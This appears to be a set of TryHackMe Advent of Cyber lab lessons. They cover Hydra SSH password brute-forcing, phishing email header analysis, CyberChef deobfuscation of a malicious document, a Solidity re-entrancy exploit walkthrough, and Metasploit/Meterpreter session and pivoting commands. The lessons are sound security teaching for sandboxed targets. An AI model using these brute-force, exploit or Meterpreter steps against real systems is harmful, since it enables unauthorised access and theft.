-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP` is identical to the previous example. `MACHINE_IP ssh` is the same as `ssh://MACHINE_IP`.

You can replace `ssh` with another protocol name, such as `rdp`, `vnc`, `ftp`, `pop3` or any other protocol supported by Hydra.

There are some extra optional arguments that you can add:

-   `-V` or `-vV`, for verbose, makes Hydra show the username and password combinations being tried. This verbosity is very convenient to see the progress, especially if you still need to be more confident in your command-line syntax.
-   `-d`, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, `-d` will reveal this immediately.

In the terminal window below, we use Hydra to find the password of the username `alexander` that allows access via SSH.

AttackBox Terminal

```shell-session
root@AttackBox# hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -V

You can experiment by repeating the same command `hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -V` on the AttackBox’s terminal. The password of the username `alexander` was found to be `sakura`, the 114th in the `rockyou.txt` password list. In TryHackMe tasks, we expect any attack to finish within less than five minutes; however, the attack would usually take longer in real-life scenarios. Options for verbosity or debugging can be helpful if you want Hydra to update you about its progress.

## Connecting to a VNC Server

Many clients can be used to connect to a VNC server. If you are connecting from the AttackBox, we recommend using Remmina. To start Remmina, from the Applications menu in the upper right, click on the Internet group to find Remmina.

![Remmina can be launched from the Internet group in the Applications menu.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1729f676200d2e232474254d392dd8d1.png)  

If you get a dialog box to unlock your login keyring, click Cancel.

### [Day 6] Email Analysis It's beginning to look a lot like phishing

                       The Story  

![AoC Day 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/05efac424e76531bc2a88d0327d1df4a.png)  

Check out CyberSecMeg's video walkthrough for Day 6 [here](https://www.youtube.com/watch?v=dcGvnZ4JDHI)!

Elf McBlue found an email activity while analysing the log files. It looks like everything started with an email...

Learning Objectives

-   Learn what email analysis is and why it still matters.
-   Learn the email header sections.
-   Learn the essential questions to ask in email analysis.
-   Learn how to use email header sections to evaluate an email.
-   Learn to use additional tools to discover email attachments and conduct further analysis.
-   Help the Elf team investigate the suspicious email received.

What is Email Analysis?

Email analysis is the process of extracting the email header information to expose the email file details. The email header contains the technical details of the email like sender, recipient, path, return address and attachments. Usually, these details are enough to determine if there is something suspicious/abnormal in the email and decide on further actions on the email, like filtering/quarantining or delivering. This process can be done manually and with the help of tools.

There are two main concerns in email analysis.

-   **Security issues:** Identifying suspicious/abnormal/malicious patterns in emails.
-   **Performance issues:** Identifying delivery and delay issues in emails.

In this task, we will focus on security concerns on emails, a.k.a. phishing. Before focusing on the hands-on email analysis, you will need to be familiar with the terms "social engineering" and "phishing".

-   **Social engineering:** Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These "weaknesses" can be curiosity, jealousy, greed, kindness, and willingness to help someone.
-   **Phishing:** Phishing is a sub-section of social engineering delivered through email to trick someone into either revealing personal information and credentials or executing malicious code on their computer.

Phishing emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. You can find more information on phishing by completing the [**phishing module**](https://tryhackme.com/module/phishing).

Does the Email Analysis Still Matter?

Yes! Various academic research and technical reports highlight that phishing attacks are still extremely common, effective and difficult to detect. It is also part of penetration testing and red teaming implementations (paid security assessments that examine organisational cybersecurity). Therefore, email analysis competency is still an important skill to have. Today, various tools and technologies ease and speed up email analysis. Still, a skilled analyst should know how to conduct a manual analysis when there is no budget for automated solutions. It is also a good skill for individuals and non-security/IT people!

Important Note: In-depth analysis requires an isolated environment to work. It is only suggested to download and upload the received emails and attachments if you are in the authorised team and have an isolated environment. Suppose you are outside the corresponding team or a regular user. In that case, you can evaluate the email header using the raw format and conduct the essential checks like the sender, recipient, spam score and server information. Remember that you have to inform the corresponding team afterwards.

How to Analyse Emails?

Before learning how to conduct an email analysis, you need to know the structure of an email header. Let's quickly review the email header structure.

**Field**

**Details**

**From**

The sender's address.

**To**

The receiver's address, including CC and BCC.

**Date**

Timestamp, when the email was **sent.**

**Subject**

The subject of the email.

**Return Path**

The return address of the reply, a.k.a. "Reply-To".

If you reply to an email, the reply will go to the address mentioned in this field.

**Domain Key and DKIM Signatures**

Email signatures are provided by email services to identify and authenticate emails.

**SPF**

Shows the server that was used to send the email.

It will help to understand if the actual server is used to send the email from a specific domain.

**Message-ID**

Unique ID of the email.

**MIME-Version**

Used MIME version.

It will help to understand the delivered "non-text" contents and attachments.

**X-Headers**

The receiver mail providers usually add these fields.

Provided info is usually experimental and can be different according to the mail provider.

**X-Received**

Mail servers that the email went through.

**X-Spam Status**

Spam score of the email.

**X-Mailer**

Email client name.

Important Email Header Fields for Quick Analysis

Analysing multiple header fields can be confusing at first glance, but starting from the key points will make the analysis process slightly easier. A simple process of email analysis is shown below.  

**Questions to Ask / Required Checks** 

**Evaluation**

Do the "From", "To", and "CC" fields contain valid addresses?

Having invalid addresses is a red flag.

Are the "From" and "To" fields the same?

Having **the same** sender and recipient is a red flag.

Are the "From" and "Return-Path" fields the same?

Having **differen**t values in these sections is a red flag.

Was the email sent from the correct server?

Email should have come from the official mail servers of the sender.

Does the "Message-ID" field exist, and is it valid?

Empty and malformed values are red flags.

Do the hyperlinks redirect to suspicious/abnormal sites?

Suspicious links and redirections are red flags.

Do the attachments consist of or contain malware?

Suspicious attachments are a red flag.

File hashes marked as suspicious/malicious by sandboxes are a red flag.

You'll also need an email header parser tool or configure a text editor to highlight and spot the email header's details easily. The difference between the raw and parsed views of the email header is shown below.

Note: The below example is demonstrated with the tool "Sublime Text". The tool is configured and ready for task usage in the given VM.   

![raw vs highlighed header](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f3e74d182c55d8c943609bbeaa99fcfd.png)  

You can use Sublime Text to view email files without opening and executing any of the linked attachments/commands. You can view the email file in the text editor using two approaches.

  

-   Right-click on the sample and open it with Sublime Text.
-   Open Sublime Text and drag & drop the sample into the text editor.

![Open email file in a text editor](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/60c3da93bf82ac7d5cda9d31116edd84.png)  

  

If your file has a **".eml"** or **".msg"** extension, the sublime text will automatically detect the structure and highlight the header fields for ease of readability. Note that if you are using a **".txt"** or any other extension, you will need manually select the highlighting format by using the button located at the lower right corner.  
  

![Change highlight syntax](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/59bdec958210eed28518803f3b6fe604.png)  

  

  

Text editors are helpful in analysis, but there are some tools that can help you to view the email details in a clearer format. In this task, we will use the "emlAnalyzer" tool to view the body of the email and analyse the attachments. The emlAnalyzer is a tool designed to parse email headers for a better view and analysis process. The tool is ready to use in the given VM. The tool can show the headers, body, embedded URLs, plaintext and HTML data, and attachments. The sample usage query is explained below.

  

**Query Details**

**Explanation**

**emlAnalyzer**

Main command

**-i** 

File to analyse  
-i /path-to-file/filename  
**Note:** Remember, you can either give a full file path or navigate to the required folder using the "cd" command.

**--header**

Show header

**-u**

Show URLs

**--text**

Show cleartext data

**--extract-all**

Extract all attachments

Sample usage is shown below. Now use the given sample and execute the given command.  

  

emlAnalyzer Usage

```shell-session

```

At this point, you should have completed the following checks.  

  

-   Sender and recipient controls
-   Return path control
-   Email server control
-   Message-ID control
-   Spam value control 
-   Attachment control (Does the email contains any attachment?)

Additionally, you can use some Open Source Intelligence (OSINT) tools to check email reputation and enrich the findings. Visit the given site below and do a reputation check on the sender address and the address found in the return path.

  

-   **Tool:** `https://emailrep.io/`

![Email reputation check](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/91616d2eb4be20f6118c056b0fce8a12.png)  

  

Here, if you find any suspicious URLs and IP addresses, consider using some OSINT tools for further investigation. While we will focus on using Virustotal and InQuest, having similar and alternative services in the analyst toolbox is worthwhile and advantageous.

  

**Tool**

**Purpose**

**VirusTotal**  

A service that provides a cloud-based detection toolset and sandbox environment.  

**InQuest**  

A service provides network and file analysis by using threat analytics.  

**IPinfo.io**  

A service that provides detailed information about an IP address by focusing on geolocation data and service provider.

**Talos Reputation**  

An IP reputation check service is provided by Cisco Talos.  

**Urlscan.io**  

A service that analyses websites by simulating regular user behaviour.  

**Browserling**  

A browser sandbox is used to test suspicious/malicious links.  

**Wannabrowser**  

A browser sandbox is used to test suspicious/malicious links.  

After completing the mentioned initial checks, you can continue with body and attachment analysis. Now, let's focus on analysing the email body and attachments. The sample doesn't have URLs, only an attachment. You need to compute the value of the file to conduct file-based reputation checks and further your analysis. As shown below, you can use the sha256sum tool/utility to calculate the file's hash value. 

  
**Note:** Remember to navigate to the file's location before attempting to calculate the file's hash value.  

  

emlAnalyzer Usage

```shell-session
user@ubuntu$ sha256sum Division_of....
0827bb9a.... 
```

  

![VirusTotal](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c2c773b4d53b467950632c80649553f7.png)Once you get the sum of the file, you can go for further analysis using the **VirusTotal**.  

  

-   Tool: `https://www.virustotal.com/gui/home/upload`

Now, visit the tool website and use the `SEARCH` option to conduct hash-based file reputation analysis. After receiving the results, you will have multiple sections to discover more about the hash and associated file. Sections are shown below.

![Virustotal sections](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/d71085a61113f7bf87b31dcd0e40570c.png)

-   Search the hash value
-   Click on the `BEHAVIOR` tab.
-   Analyse the details.

After that, continue on reputation check on **InQuest** to enrich the gathered data.

  

-   **Tool:** `https://labs.inquest.net/`

Now visit the tool website and use the `INDICATOR LOOKUP` option to conduct hash-based analysis.

  

-   Search the hash value
-   Click on the SHA256 hash value highlighted with yellow to view the detailed report.
-   Analyse the file details.

  

![InQuest](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f7a0ebef6bbe5b127fe4787a5caf9811.png)  

  

After finishing the shown steps, you are finished with the initial email analysis. The next steps are creating a report of findings and informing the team members/manager in the appropriate format.  

  
Now is the time to put what we've learned into practice. Click on the Start Machine button at the top of the task to launch the Virtual Machine. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. Now, back to elf McSkidy analysing the suspicious email that might have helped the Bandit Yeti infiltrate Santa's network.  

  

**IMPORTANT NOTES:**

-   **Given email sample contains a malicious attachment.**
-   **Never directly interact with unknown email attachments outside of an isolated environment.**

###  [Day 7] CyberChef Maldocs roasting on an open fire

                       The Story  

![Shows AOC day 7 Image Head](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/02a402283ddc03c2afd62b0f31f722b3.png)

Check out SecurityNinja's video walkthrough for Day 7 [here](https://www.youtube.com/watch?v=W4dZW5s2CeA)!  

In the previous task, we learned that McSkidy was indeed a victim of a spearphishing campaign that also contained a suspicious-looking document `Division_of_labour-Load_share_plan.doc`. McSkidy accidentally opened the document, and it's still unknown what this document did in the background. McSkidy has called on the in-house expert **Forensic McBlue** to examine the malicious document and find the domains it redirects to. Malicious documents may contain a suspicious command to get executed when opened, an embedded malware as a dropper (malware installer component), or may have some C2 domains to connect to.  

Learning Objectives![Cyberchef logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e00238f51f4e22b052fba6c422c3423d.png)

-   What is CyberChef
-   What are the capabilities of CyberChef
-   How to leverage CyberChef to analyze a malicious document
-   How to deobfuscate, filter and parse the data

Lab Deployment

For today's task, you will need to deploy the machine attached to this task by pressing the green "**Start Machine**" button located at the top-right of this task. The machine should launch in a split-screen view. If it does not, you will need to press the blue "Show Split View" button near the top-right of this page.

CyberChef Overview  

CyberChef is a web-based application - used to slice, dice, encode, decode, parse and analyze data or files. The CyberChef layout is explained below. An offline version of cyberChef is bookmarked in Firefox on the machine attached to this task.  

![CyberChef Interface](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/47c75a03ac04b0c2922a1cbbcefad496.png)

1.  Add the text or file in panel 1.
2.  Panel 2 contains various functions, also known as recipes that we use to encode, decode, parse, search or filter the data.
3.  Drag the functions or recipes from Panel 2 into Panel 3 to create a recipe.
4.  The output from the recipes is shown in panel 4.
5.  Click on bake to run the functions added in Panel 3 in order. We can select AutoBake to automatically run the recipes as they are added.  
    

Using CyberChef for mal doc analysis

Let's utilize the functions, also known as recipes, from the left panel in CyberChef to analyze the malicious doc. Each step is explained below:  

**1) Add the File to CyberChef**

Drag the invoice.doc file from the desktop to panel 1 as input, as shown below. Alternatively, the user can add the`Division_of_labour-Load_share_plan.doc` file by Open file as input icon in the top-right area of the CyberChef page.  

![Shows how to drag a file into CyberChef as input](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/44901d6b3afd7c63acf7c9c0c9c3e18b.gif)  

**2) Extract strings**  

Strings are ASCII and Unicode-printable sequences of characters within a file. We are interested in the strings embedded in the file that could lead us to suspicious domains. Use the `strings` function from the left panel to extract the strings by dragging it to panel 3 and selecting **All printable chars** as shown below:  

![Extract strings using strings function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/12b35d2dcb21944881d978f6f65e8d42.gif)  

If we examine the result, we can see some random strings of different lengths and some obfuscated strings. Narrow down the search to show the strings with a larger length. Keep increasing the minimum length until you remove all the noise and are only left with the meaningful string, as shown below:  

![Filter strings by the size using strings function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/6e8e2cb719260599ed8a51843b34fa19.png)  

**3) Remove Pattern  
**

Attackers often add random characters to obfuscate the actual value. If we examine, we can find some repeated characters `[ _ ]`. As these characters are common in different places, we can use regex **(regular expressions)** within the `Find / Replace` function to find and remove these repeated characters.

To use regex, we will put characters within the square brackets `[ ]` and use backslash `\` to escape characters. In this case, the final regex will be`[**\[\]\n_**]` where `\n` represents **the Line feed**, as shown below:

![Use Regex in Find/Replace to filter data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/8c0b0f724002e6dc8457d8b7f095c486.png)  

It's evident from the result that we are dealing with a PowerShell script, and it is using base64 Encoded string to hide the actual code.  

**4) Drop Bytes**

To get access to the base64 string, we need to remove the extra bytes from the top. Let's use the `Drop bytes` function and keep increasing the number until the top bytes are removed.

![Use drop bytes to drop unwanted bytes](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/c1e177a5656640e25ef0c5a83990f8a7.png)  

**5) Decode base64**

Now we are only left with the base64 text. We will use the `From base64` function to decode this string, as shown below:

![Use from Base64 to decode text from Base84 encoded value](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/309cbbd50b3b5e27e17677f96f04b069.png)  

**6) Decode UTF-16  
**

The base64 decoded result clearly indicates a PowerShell script which seems like an interesting finding. In general, the PowerShell scripts use the `Unicode UTF-16LE` encoding by default. We will be using the `Decode text` function to decode the result into UTF-16E, as shown below:

![Decode to UTF-16LE using decode text function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/0faa8f5668d9d998696aa8547d80c3b7.png)  

**7) Find and Remove Common Patterns**

Forensic McBlue observes various repeated characters  ``' ( ) + ' ` "`` within the output, which makes the result a bit messy. Let's use regex in the `Find/Replace` function again to remove these characters, as shown below. The final regex will be ``['()+'"`]``.  

![Use regex within Find/Replace to filter data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/da469d1dabcf929dbc1765d06917521d.png)  

**8) Find and Replace  
**

If we examine the output, we will find various domains and some weird letters `]b2H_` before each domain reference. A replace function is also found below that seems to replace this `]b2H_` with `http`.

![Shows usage of Find/Replace function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/938334f69a64ce058bd2046da3928114.png)  

Let's use the `find / Replace` function to replace `]b2H_` with `http` as shown below:

![Use Replace/Replace function to replace chars](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/d71d6682328beec84e0948a6ade15c69.png)  

**9) Extract URLs**

The result clearly shows some domains, which is what we expected to find. We will use the `Extract URLs` function to extract the URLs from the result, as shown below:

![Use Extract URLs function to extract URLs from the data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/76d6badf89e2022315851487435f12f6.png)  

**10) Split URLs with @**

The result shows that each domain is followed by the `@`character, which can be removed using the split function as shown below:

![Use split function to split lines](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/7f2239c965339cf309d101f6c8d713eb.png)  

**11) Defang URL**  

Great - We have finally extracted the URLs from the malicious document; it looks like the document was indeed malicious and was downloading a malicious program from a suspicious domain.

Before passing these domains to the SOC team for deep malware analysis, it is recommended to defang them to avoid accidental clicks. Defanging the URLs makes them unclickable. We will use `Defang URL` to do the task, as shown below:  

![Use Defang to defang URLs to make them unclickable](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/58a58436becb51b25dbb13ebe56b9a02.png)

###  [Day 8] Smart Contracts Last Christmas I gave you my ETH

                               The Story

![a day 8 banner illustration](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/107f2c680831cc1fa710767c34825e5a.png)

Check out MWRSecurity's video walkthrough for Day 8 [here](https://www.youtube.com/watch?v=4Oydt3fNlgQ)!  

After it was discovered that Best Festival Company was now on the blockchain and attempting to mint their cryptocurrency, they were quickly compromised. Best Festival Company lost all its currency in the exchange because of the attack. It is up to you as a red team operator to discover how the attacker exploited the contract and attempt to recreate the attack against the same target contract.  

### Learning Objectives

-   Explain what smart contracts are, how they relate to the blockchain, and why they are important.
-   Understand how contracts are related, what they are built upon, and standard core functions.
-   Understand and exploit a common smart contract vulnerability.

### What is a Blockchain?

One of the most recently innovated and discussed technologies is the blockchain and its impact on modern computing. While historically, it has been used as a financial technology, it's recently expanded into many other industries and applications. Informally, a blockchain acts as a database to store information in a specified format and is shared among members of a network with no one entity in control.

By definition, a blockchain is a digital database or ledger distributed among nodes of a peer-to-peer network. The blockchain is distributed among "peers" or members with no central servers, hence "decentralized." Due to its decentralized nature, each peer is expected to maintain the integrity of the blockchain. If one member of the network attempted to modify a blockchain maliciously, other members would compare it to their blockchain for integrity and determine if the whole network should express that change.

The core blockchain technology aims to be decentralized and maintain integrity; cryptography is employed to negotiate transactions and provide utility to the blockchain.

But what does this mean for security? If we ignore the core blockchain technology itself, which relies on cryptography, and instead focus on how data is transferred and negotiated, we may find the answer concerning. Throughout this task, we will continue to investigate the security of how information is communicated throughout the blockchain and observe real-world examples of practical applications of blockchain.

### Introduction to Smart Contracts

A majority of practical applications of blockchain rely on a technology known as a smart contract. Smart contracts are most commonly used as the backbone of DeFi applications (Decentralized Finance applications) to support a cryptocurrency on a blockchain. DeFi applications facilitate currency exchange between entities; a smart contract defines the details of the exchange. A smart contract is a program stored on a blockchain that runs when pre-determined conditions are met.

Smart contracts are very comparable to any other program created from a scripting language. Several languages, such as Solidity, Vyper, and Yul, have been developed to facilitate the creation of contracts. Smart contracts can even be developed using traditional programming languages such as Rust and JavaScript; at its core, smart contracts wait for conditions and execute actions, similar to traditional logic.

### Functionality of a Smart Contract

Building a smart contract may seem intimidating, but it greatly contrasts with core object-oriented programming concepts.

Before diving deeper into a contract's functionality, let's imagine a contract was a class. Depending on the fields or information stored in a class, you may want individual fields to be private, preventing access or modification unless conditions are met. A smart contract's fields or information should be private and only accessed or modified from functions defined in the contract. A contract commonly has several functions that act similarly to accessors and mutators, such as checking balance, depositing, and withdrawing currency.

Once a contract is deployed on a blockchain, another contract can then use its functions to call or execute the functions we just defined above.

If we controlled Contract A and Contract B wanted to first deposit 1 Ethereum, and then withdraw 1 Ethereum from Contract A,

Contract B calls the deposit function of Contract A.

Contract A authorizes the deposit after checking if any pre-determined conditions need to be met.

![Diagram of deposit function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/7c206b5cd15dbb4ebd4d9dbbe420d905.png)  

Contract B calls the withdraw function of Contract A.

Contract A authorizes the deposit if the pre-determined conditions for withdrawal are met.

![Diagram of withdraw function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2a1e2111efdc9b545b1abac86ef792ca.png)  

Contract B can execute other functions after the Ether is sent from Contract A but before the function resolves.

![Diagram of withdraw and other functions](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/667fe1f786b635b1153973a4a7c8703a.png)  

### How do Vulnerabilities in Smart Contracts Occur?

Most smart contract vulnerabilities arise due to logic issues or poor exception handling. Most vulnerabilities arise in functions when conditions are insecurely implemented through the previously mentioned issues.

Let's take a step back to Contract A in the previous section. The conditions of the withdraw function are,

-   Balance is greater than zero
-   Send Etherium

At first glance, this may seem fine, but when is the amount to be sent subtracted from the balance? Referring back to the contract diagram, it is only ever deducted from the balance after the Etherium is sent. Is this an issue? The function should finish before the contract can process any other functions. But if you recall, a contract can consecutively make new calls to a function while an old function is still executing. An attacker can continuously attempt to call the withdraw function before it can clear the balance; this means that the pre-defined conditions will always be met. A developer must modify the function's logic to remove the balance before another call can be made or require stricter requirements to be met.

### The Re-entrancy Attack

In the above section, we informally introduced a common vulnerability known as re-entrancy. Reiterating what was covered above, re-entrancy occurs when a malicious contract uses a fallback function to continue depleting a contract's total balance due to flawed logic after an initial withdraw function occurs.

We have broken up the attack into diagrams similar to those previously seen to explain this better.

Assuming that contract B is the attacking contract and contract A is the storage contract. Contract B will execute a function to deposit, then withdraw at least one Ether. This process is required to initiate the withdraw function's response.

![Diagram of attack function depositing 1 ether](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5f3c424d4d6fb10d1c375649d30c7035.png)  

Note the difference between account balance and total balance in the above diagram. The storage contract separates balances per account and keeps each account's total balance combined. We are specifically targeting the total balance we do not own to exploit the contract.

![Diagram of withdraw function calling back to the attack function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c3a7d046821759f5237be1f1faab186e.png)  

At this point, contract B can either drop the response from the withdraw function or invoke a fallback function. A fallback function is a reserved function in Solidity that can appear once in a single contract. The function is executed when currency is sent with no other context or data, for example, what is happening in this example. The fallback function calls the withdraw function again, while the original call to the function was never fully resolved. Remember, the balance is never set back to zero, and the contract thinks of Ether as its total balance when sending it, not divided into each account, so it will continue to send currency beyond the account's balance until the total balance is zero.

![Diagram of the infinite loop between attack and withdraw function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2f6c70c60729404d5a404de2c409a5a7.png)  

Because the withdraw function sends Ether with no context or data, the fallback function will be called again, and thus an infinite loop can now occur.

Now that we have covered how this vulnerability occurs and how we can exploit it, let's put it to the test! We have provided you with the contract deployed by Best Festival Company in a safe and controlled environment that allows you to deploy contracts as if they were on a public blockchain.

### Practical Application

We have covered almost all of the background information needed to hit the ground running; let’s try our hand at actively exploiting a contract prone to a re-entrancy vulnerability. For this task, we will use [Remix IDE](https://remix.ethereum.org/), which offers a safe and controlled environment to test and deploy contracts as if they were on a public blockchain.

Download the zip folder attached to this task, and open Remix in your preferred browser.

We have provided you with two files, one gathered from the Best Festival Company used to host their cryptocurrency balance and another malicious contract that will attempt to exploit the re-entrancy vulnerability.

Both contracts are legitimate Solidity contracts, but no need to worry if you need help understanding the program syntax behind each. They follow the same functionality and methodology we covered throughout this task, just translated to code!

****Getting Familiar with the Remix Environment****

When you first open Remix, you want to draw your attention to the left side; there will be a file explorer, search, Solidity compiler, and deployment navigation button, respectively, from top to bottom. We will spend most of our time in the deploy & run transactions menu as it allows us to select from an environment, account, and contract and interact with contracts we have compiled.

****Importing the Necessary Contracts****

To get started with the task, you will need to import the task files provided to you. To do this, navigate to _file explorer → default_workspace → load a local file into the current workspace_. From here, you can select the necessary `.sol` files to be imported. We have provided you with an `EtherStore.sol` and `Attack.sol` file that functions as we introduced in this section.

****Compiling the Contracts****

![Screenshot of deploy and run transactions menu of Remix IDE](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3d0ae9889e1addf60a1d6e79395c5bd0.png)

The next step is to compile the contracts, navigate to the _s__olidity compiler_, and select `0.8.10+commitfcxxxxxx` from the dropdown _compiler_ menu. Now you can compile the contract by pressing the _compile_ button. You can ignore any _warnings_ you may receive when compiling.

****Deploying and Interacting with Contracts****

Now that we have the contracts compiled, they are ready to be deployed from the deployment tab. To the right is a screenshot of the deployment tab and labels that we will use to reference menu elements as we move throughout the deployment process.

First, we must select a contract for deployment from the _contract_ dropdown (_label 6_). We should deploy the EtherStore contract or target contract to begin. For deployment, you only need to press the _deploy_ button (_label 7)._

We can now interact with the contract underneath the _deployed contracts_ subsection. To test the contract, we can deposit Ether into the contract to be added to the total balance. To deposit, insert a value in the _value_ textbox (_label 4_) and select the currency denomination at the dropdown under _label 5._ Once setup is complete, you can deposit by pressing the deposit button (_label 10_).

Note: when pressing the deposit button, this is a public function we are calling just as if it were another contract calling the function externally.

We’ve now successfully deployed our first contract and used it! You should see the _Balance_ update (_label 9_).

Now that we have deployed our first contract, switch to a different account (dropdown _label 2_ and select a new account) and repeat the same process. This time you will be exploiting the original contract and should see the exploit actively occur! We have provided a summary of the steps to deploy and interact with a contract below.

Step 1: Select the contract you want to deploy from the _contract_ dropdown menu under _label 6_.

Step 2: Deploy the contract by pressing the deploy button.

Note: you need to provide a reference to the contract you are targeting before deploying the attack contract. To accomplish this, copy the address for _EtherStore_ from _label 11_ and paste the value in the textbox under _label 8_.

Step 3: Confirm the contract was deployed and the attack function can be seen from the _deployed contracts_ subsection.

Step 4: Execute and/or interact with the contract’s function; note that most functions require some form of value input to execute a function properly.

If you get stuck, re-read through the discovery and explanation of the re-entrancy vulnerability. Recall that it must first deposit and withdraw before the fallback function can occur.

### Learning Objectives

-   Using Metasploit modules and Meterpreter to compromise systems
-   Network Pivoting
-   Post exploitation

### Concepts

#### What is Docker?

Docker is a way to package applications, and the associated dependencies into a single unit called an image. This image can then be shared and run as a container, either locally as a developer or remotely on a production server. Santa’s web application and database are running in Docker containers, but only the web application is directly available via an exposed port. A common way to tell if a compromised application is running in a Docker container is to verify the existence of a `/.dockerenv` file at the root directory of the filesystem.

#### What is Metasploit?

Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems. Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7.

### What is a Metasploit session?

After successfully exploiting a remote target with a Metasploit module, a session is often opened by default. These sessions are often Command Shells or Meterpreter sessions, which allow for executing commands against the target. It’s also possible to open up other session types in Metasploit, such as SSH or WinRM - which do not require payloads.

The common Metasploit console commands for viewing and manipulating sessions in Metasploit are:

Metasploit Console Commands

```shell-session
# view sessions
sessions

# upgrade the last opened session to Meterpreter
sessions -u -1

# interact with a session
sessions -i session_id

# Background the currently interactive session, and go back to the Metasploit prompt
background
```

### What is Meterpreter?

Meterpreter is an advanced payload that provides interactive access to a compromised system. Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.

Meterpreter has multiple useful commands, such as the following:

Meterpreter Commands

```shell-session
# Get information about the remote system, such as OS
sysinfo

# Upload a file or directory
upload local_file.txt

# Display interfaces
ipconfig

# Resolve a set of host names on the target to IP addresses - useful for pivoting
resolve remote_service1 remote_service2
```

Note that normal command shells do not support complex operations such as pivoting. In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with `sessions -u -1`.

You can identify the opened session types with the `sessions` command. If you are currently interacting with a Meterpreter session, you must first `background` it. In the below example, the two session types are `shell cmd/unix` and `meterpreter x86/linux`:

Meterpreter Commands

```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                        Connection
  --  ----  ----                   -----------                                        ----------
  4         shell cmd/unix                                                            10.11.8.17:4444 -> 10.10.152.194:44124 (10.10.152.194)
  5         meterpreter x86/linux  www-data @ 172.28.101.50                           10.11.8.17:4433 -> 10.10.152.194:33296 (172.28.101.50)
        
```

#### What is Pivoting?

Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached.

For example - an initial foothold could be gained through a web application running in a docker container or through an exposed port on a Windows machine. This system will become the attack launchpad for other systems in the network.

![Image of initial foothold between a pentester host and a compromised container](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/96b6f34691943493b36baed19bd4641a.png)

We can route network traffic through this compromised machine to run network scanning tools such as `nmap` or `arp` to find additional machines and services which were previously inaccessible to the pentester. This concept is called network pivoting.

![Image of pivoting using a compromised container to other endpoints on the network](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/81947d7cc301f1505f383089991cd3bc.png)

###   

### Launching The TryHackMe Kali Linux

For this task, you need to be using a Kali machine. TryHackMe host and provide a version of Kali Linux that is controllable in your browser. You can also connect with your own Kali Linux using OpenVPN.   
  
You can deploy the TryHackMe Kali Machine by following the steps below:

1. Scroll to the top of the page and press the drop-down arrow on the right of the blue "Start AttackBox" button:

![an image illustrating the location of the Kali VM launch button](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/04378b544195b1a61acf1fa4d035fd48.png)  

